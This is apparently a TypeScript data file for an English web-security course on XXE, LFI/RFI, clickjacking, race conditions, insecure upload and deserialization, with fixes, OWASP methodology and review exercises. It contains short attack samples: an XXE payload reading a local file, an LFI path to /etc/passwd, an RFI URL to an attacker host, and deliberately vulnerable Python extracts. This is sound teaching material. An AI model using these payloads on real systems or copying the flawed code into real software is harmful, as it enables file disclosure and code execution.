import type { CourseBody } from '../../types';
import { questions } from './questions.en';

export const body: CourseBody = {
  courseId: 'f-xxe-rfi-clickjacking-race',
  lesson: {
    intro:
      'The first two Web courses covered injections, XSS, access control and attacks that hijack the server. Some less publicized but very real vulnerabilities remain: an overly permissive XML parser that reads server files, an application that includes a file whose name comes from the user, a booby-trapped page laid over the real one, or two simultaneous requests that bypass a limit. This course explains and fixes them, then shows how to test an application methodically.',
    sections: [
      {
        id: 'xxe',
        title: 'XXE: XML external entities',
        blocks: [
          { t: 'p', text: 'The XML format allows defining **entities**, shortcuts replaced during parsing. An **external entity** asks the parser to load a resource (a local file, a URL). If the application parses user-supplied XML with a parser that allows external entities, the attacker chooses the resource loaded: this is the **XXE** attack.' },
          { t: 'code', lang: 'xml', caption: 'XXE payload (in a lab) reading a local file', code: '<?xml version="1.0"?>\n<!DOCTYPE data [\n  <!ENTITY x SYSTEM "file:///etc/hostname">\n]>\n<data>&x;</data>\n\n<!-- If the parser resolves &x;, the file content is inserted\n     into the application’s response. -->' },
          { t: 'def', term: 'Impact of an XXE', text: 'Depending on the configuration: reading server files, requests to internal services (a form of SSRF), sometimes denial of service through entity expansion. The data read can be returned directly or exfiltrated to a controlled server.' },
          { t: 'callout', kind: 'key', title: 'Fix', text: 'Disable the resolution of external entities and DTDs in the XML parser (often one or two configuration options). Prefer simpler formats (JSON) when XML is not needed, and keep parsing libraries up to date, as some are vulnerable by default depending on the version.' },
        ],
      },
      {
        id: 'inclusion',
        title: 'File inclusion: LFI and RFI',
        blocks: [
          { t: 'p', text: 'Some applications build the path of a file to include from user data (`?page=home`). If this data is not controlled, the attacker chooses the file.' },
          {
            t: 'table',
            head: ['Type', 'Principle', 'Consequence'],
            rows: [
              ['**LFI** (local inclusion)', 'Include a file **from the server** (`?page=../../etc/passwd`)', 'Reading sensitive files; code execution if an attacker-controlled file is included'],
              ['**RFI** (remote inclusion)', 'Include a file from an external **URL** (`?page=http://attacker/x`)', 'Direct execution of code supplied by the attacker (very serious)'],
            ],
          },
          { t: 'def', term: 'Why RFI is rare today', text: 'RFI assumes that the language includes and executes a remote file. Modern configurations disable inclusion of external URLs by default (for example `allow_url_include` off in PHP), which limits RFI; LFI, for its part, remains frequent.' },
          { t: 'callout', kind: 'key', title: 'Fix', text: 'Do not build a path or a URL from user input. Map each expected value to a known resource (lookup table), or strictly validate then normalize the path and check that it stays within the allowed directory. Disable inclusion of remote URLs.' },
        ],
      },
      {
        id: 'clickjacking',
        title: 'Clickjacking',
        blocks: [
          { t: 'p', text: '**Clickjacking** consists in displaying the real application in an invisible frame, laid over a decoy page, so that the victim believes they are clicking on the decoy while acting on the application where they are logged in (confirming a payment, changing a setting).' },
          { t: 'diagram', id: 'clickjacking', caption: 'Clickjacking: an invisible frame of the real application is laid over a decoy page, at the same position.', alt: 'Two panels at the same screen position: on the left the visible decoy page with a “Watch the video” button and the cursor; on the right the invisible frame (dotted) of the real application with a sensitive “Confirm payment” button in the same place; the victim thinks they are clicking the decoy but triggers the hidden sensitive button.' },
          { t: 'code', lang: 'http', caption: 'Protection through response headers', code: 'Content-Security-Policy: frame-ancestors \'none\'\n# or, to allow only your own site:\nContent-Security-Policy: frame-ancestors \'self\'\n\n# Legacy header, still useful for old browsers:\nX-Frame-Options: DENY' },
          { t: 'def', term: 'frame-ancestors', text: 'CSP directive that indicates which sites are allowed to display the page in a frame (iframe). `\'none\'` forbids any framing; `\'self\'` allows it only for the site itself. It replaces the old `X-Frame-Options` header.' },
          { t: 'callout', kind: 'tip', text: 'Sensitive pages (payment, password change, action confirmation) must at least forbid being framed. Important actions also benefit from requiring an explicit confirmation, hard to hijack through overlay.' },
        ],
      },
      {
        id: 'race',
        title: 'Application race conditions',
        blocks: [
          { t: 'p', text: 'A **race condition** occurs when the result depends on the order of execution of several concurrent operations. In web security, the attacker sends several requests **in parallel** to exploit the interval between a check and the corresponding action.' },
          { t: 'def', term: 'TOCTOU', text: 'Time-Of-Check to Time-Of-Use: the check (“is the balance sufficient?”, “is this promo code still valid?”) and the action (debit, apply the discount) are not atomic. Between the two, another request acts, and the check made no longer matches the real state.' },
          {
            t: 'example',
            title: 'Exceeding a limit with simultaneous requests',
            blocks: [
              { t: 'p', text: 'A discount code is “single-use”. The application checks that it has not been used, then applies it. By sending 20 requests at exactly the same time, several pass the check before the first has marked the code as used: the discount is applied several times.' },
            ],
          },
          { t: 'callout', kind: 'key', title: 'Fix', text: 'Make the whole check + action **atomic**: uniqueness constraint in the database, conditional update in a single operation (`UPDATE … WHERE not_used`), lock or transaction, or idempotent processing with a request identifier. A limit applied in two non-atomic steps can be bypassed.' },
        ],
      },
      {
        id: 'methodo',
        title: 'Testing methodically: the OWASP guide',
        blocks: [
          { t: 'p', text: 'Looking for vulnerabilities at random leaves gaps. The **OWASP testing guide** (Web Security Testing Guide, WSTG) offers a structured approach, by categories (session management, access control, input validation, configuration…), to be carried out **only on applications you are authorized to test**: your own, an acceptance environment, or a training target designed for this purpose.' },
          { t: 'list', ordered: true, items: ['**Map** the application: pages, entry points, roles, technologies.', '**Go through the WSTG categories**, noting what is tested and the result.', '**Reproduce** each finding reliably and assess its impact.', '**Document**: description, evidence, impact, proposed fix.', '**Verify** the fix after remediation.'] },
          { t: 'def', term: 'OWASP ASVS and WSTG', text: 'The ASVS lists the security **requirements** to verify; the WSTG describes **how** to test them. One serves to define the expected level, the other to conduct the assessment.' },
          { t: 'callout', kind: 'legal', text: 'Testing an application without authorization is illegal, even without intent to harm. A security test is done within a scope defined in writing (see the course on pentest methodology) or on training environments designed for this.' },
        ],
      },
      {
        id: 'televersement',
        title: 'File upload and deserialization',
        blocks: [
          { t: 'p', text: 'Two ordinary features bring **user-controlled bytes** into the server: uploading a file (avatar, supporting document) and rebuilding objects from received data (cookie, message, session file). Badly handled, they lead to code execution.' },
          {
            t: 'table',
            head: ['Risk', 'Mechanism', 'Countermeasure'],
            rows: [
              ['**Execution of an uploaded script**', 'A `.php` or `.jsp` file dropped into a directory served and executed by the server', 'Store **outside the web root** (or in object storage), never executable'],
              ['**Control bypass**', '`shell.php.jpg`, double extension, forged client-sent MIME type', 'Extension allowlist, check of the **real content** (file signature), random renaming'],
              ['**Booby-trapped file name**', '`../../config` in the sent name: path traversal', 'Ignore the client’s name, generate your own'],
              ['**Active file**', 'SVG or HTML containing a script: stored XSS', 'Serve with a forced type and a `Content-Disposition` header, separate domain, CSP'],
              ['**Resource exhaustion**', 'Huge file, archive that unpacks into gigabytes', 'Limits on size and number, quotas, sandboxed analysis'],
            ],
          },
          {
            t: 'example',
            title: 'Saving an avatar safely',
            blocks: [
              { t: 'code', lang: 'python', code: 'import secrets\n\nALLOWED = {"jpeg": ".jpg", "png": ".png"}\n\ndef save_avatar(file):\n    content = file.read(2_000_001)\n    if len(content) > 2_000_000:\n        raise Refused("file too large")\n    real_type = detect_format(content)            # first-bytes signature, not the name\n    if real_type not in ALLOWED:\n        raise Refused("format not allowed")\n    name = secrets.token_hex(16) + ALLOWED[real_type]   # name chosen by the server\n    write(f"/srv/avatars/{name}", content)        # outside the web root\n    return name' },
            ],
          },
          { t: 'def', term: 'Insecure deserialization', text: 'Rebuilding an object from untrusted data with a mechanism that can **instantiate arbitrary classes** or call code during the rebuilding (`pickle` in Python, `ObjectInputStream` in Java, `unserialize` in PHP, `BinaryFormatter` in .NET). A crafted payload triggers code execution **before** the application examines the resulting object.' },
          { t: 'list', items: ['**Never deserialize** untrusted data with a format that executes code.', 'Exchange data in a **simple format** (JSON) validated by a schema; the objects are rebuilt by the application, not by the format.', 'If native serialization is unavoidable, **sign** (HMAC) the data and check the signature before any deserialization, with an allowlist of classes.', 'Keep libraries up to date: many exploitation chains target known components.'] },
          { t: 'callout', kind: 'warn', text: 'A cookie containing a serialized object (preferences, cart) and read with `pickle.loads` gives the user code execution on the server: they control the cookie’s content.' },
        ],
      },
      {
        id: 'logique',
        title: 'Business logic and reporting of findings',
        blocks: [
          { t: 'p', text: 'Some flaws have no technical signature: the application does exactly what it was programmed to do, but in a sequence nobody had foreseen. Scanners do not find them: they are discovered through understanding the business and through **abuse cases**.' },
          { t: 'def', term: 'Business logic flaw', text: 'Defect in an application’s business rules (order of steps, price calculation, rights associated with a state) that allows an unintended advantage by using **legitimate** functions in a diverted way.' },
          {
            t: 'table',
            head: ['Abuse case', 'Flaw', 'Countermeasure'],
            rows: [
              ['The price is sent by the browser in the payment form', 'Trust in client-controlled data', 'Recompute price, discounts and totals on the server'],
              ['Going straight to the “confirmation” step without paying', 'Flow not enforced by the server', 'Server-side state machine: each step checks the previous ones'],
              ['Quantity `-1`: the total decreases, the line becomes a credit', 'No bounds on values', 'Validation of ranges and signs'],
              ['Refund requested several times for the same order', 'Non-idempotent operation', 'Order status checked and changed atomically'],
              ['Creating many accounts to accumulate a referral bonus', 'No per-person limit', 'Limits, abuse detection, identity verification'],
            ],
          },
          {
            t: 'example',
            title: 'An abuse case turned into a test',
            blocks: [
              { t: 'code', lang: 'text', code: 'Abuse case : add “-3 items at €10” to the cart then pay\nExpected   : refusal (invalid quantity)\nObserved   : total = €70 instead of €100, unintended discount\n\nTest       : POST /cart {"item": 12, "quantity": -3}  →  422' },
            ],
          },
          { t: 'p', text: 'A test is only worth something if it leads to a usable **report**. Each finding is described so that it can be reproduced and fixed, and its severity is assessed consistently.' },
          { t: 'def', term: 'CVSS', text: 'Scoring system that expresses the **technical severity** of a vulnerability on a scale from 0 to 10, based on criteria (attack vector, complexity, required privileges, impact on confidentiality, integrity and availability). It is completed by the business context to prioritize.' },
          { t: 'list', items: ['**Finding sheet**: title, description, reproduction steps, evidence, impact, severity (CVSS), proposed fix.', '**Prioritization**: technical severity, exposure, value of the data, ease of exploitation.', '**Confidentiality**: the report describes unfixed flaws; it goes to a restricted circle, without unneeded real data or plaintext passwords.', '**Re-verification** after the fix, with the original test.'] },
          { t: 'callout', kind: 'tip', text: 'Writing the abuse case before coding the function (“what if the user sends…?”) costs a few minutes; discovering it in production costs far more.' },
        ],
      },
    ],
    useCases: [
      'Reviewing a service that imports XML files: checking that the parser refuses external entities.',
      'Auditing an ordering application: testing promo codes and carts against race conditions.',
      'Methodical test of an acceptance application with the WSTG, then report and verification of the fixes.',
    ],
    commonMistakes: [
      'Parsing user XML with a parser that allows external entities by default.',
      'Building an inclusion path or URL from user input.',
      'Forgetting to forbid framing of sensitive pages (clickjacking).',
      'Checking then acting in two non-atomic steps, exploitable with simultaneous requests.',
      'Testing an application without written authorization.',
    ],
    bestPractices: [
      'XML parsers with external entities and DTDs disabled; JSON when XML is not needed.',
      'No user-driven file or URL inclusion: lookup table or strict validation.',
      '`Content-Security-Policy: frame-ancestors` header on sensitive pages.',
      'Check and action made atomic (uniqueness constraint, conditional update, lock, idempotence).',
      'Tests guided by the WSTG, only on authorized targets, with documentation and verification of the fixes.',
    ],
    keyPoints: [
      'XXE: overly permissive XML parser; fix by disabling external entities and DTDs.',
      'LFI/RFI: never drive an inclusion path or URL with user input.',
      'Clickjacking: `frame-ancestors` forbids framing of sensitive pages.',
      'Race condition: make check + action atomic, otherwise the limit can be bypassed.',
      'Test with a method (WSTG), only on authorized applications.',
    ],
  },
  practice: [
    {
      id: 'revue-xxe-inclusion',
      kind: 'analysis',
      title: 'Spotting XXE and inclusion in two extracts',
      context: [
        { t: 'p', text: 'Two extracts from an application:' },
        { t: 'code', lang: 'text', code: '# 1. Import of an XML document sent by the user\ndoc = xml_parser.parse(request.body)   # default parser\n\n# 2. Display of a help page\n#    URL called: /help?topic=installation\nfile = "/var/www/help/" + request.param("topic") + ".html"\nreturn(read(file))' },
      ],
      steps: ['Name the vulnerability of each extract and its possible impact.', 'Propose the fix for each.', 'Indicate a simple test to check that the fix holds.'],
    },
    {
      id: 'race-promo',
      kind: 'case',
      title: 'Case study: a single-use promo code bypassed',
      context: [{ t: 'p', text: 'An e-commerce site notices that a “single-use” discount code was applied several times on the same order. The logs show a burst of identical requests sent in under 50 ms.' }],
      steps: ['Explain the attack mechanism.', 'Propose an atomic fix at the application level and at the database level.', 'Indicate how to detect this kind of abuse.'],
    },
    {
      id: 'revue-upload',
      kind: 'analysis',
      title: 'Code review: upload and serialized preferences',
      context: [
        { t: 'code', lang: 'python', code: '# 1: avatar upload\n@app.post("/avatar")\ndef avatar():\n    f = request.files["file"]\n    if f.filename.endswith(".jpg"):\n        f.save("/var/www/html/images/" + f.filename)\n        return "ok"\n\n# 2: reading the user’s preferences\nprefs = pickle.loads(base64.b64decode(request.cookies["prefs"]))\n\n# 3: cart order\ntotal = sum(l["price"] * l["quantity"] for l in request.json["lines"])' },
      ],
      steps: ['Name the vulnerability of each extract and describe an attack.', 'Write the fix for each extract.', 'Propose an abuse case to turn into an automated test for extract 3.'],
    },
  ],
  questions,
  resources: [
    { title: 'XML External Entity Prevention Cheat Sheet', source: 'OWASP', url: 'https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html' },
    { title: 'File Upload / Path Traversal & LFI (Testing Guide)', source: 'OWASP', url: 'https://owasp.org/www-project-web-security-testing-guide/' },
    { title: 'Clickjacking Defense Cheat Sheet', source: 'OWASP', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html' },
    { title: 'Content-Security-Policy: frame-ancestors', source: 'MDN Web Docs', url: 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors' },
    { title: 'Web Security Testing Guide (WSTG)', source: 'OWASP', url: 'https://owasp.org/www-project-web-security-testing-guide/' },
  ],
};
